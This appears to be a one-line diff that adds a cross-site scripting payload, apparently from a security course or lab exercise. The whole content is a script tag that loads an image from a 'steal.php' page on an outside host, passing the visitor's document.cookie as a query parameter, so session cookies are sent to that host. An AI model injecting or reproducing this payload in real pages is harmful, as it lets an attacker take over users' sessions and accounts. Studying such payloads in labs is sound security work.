@@ -1,0 +1,1 @@
+<script type="text/javascript">var myImage = new Image();myImage.src="http://fiona.utdallas.edu/~zxw180035/xss/steal.php?cookiestolen=" + document.cookie;</script>
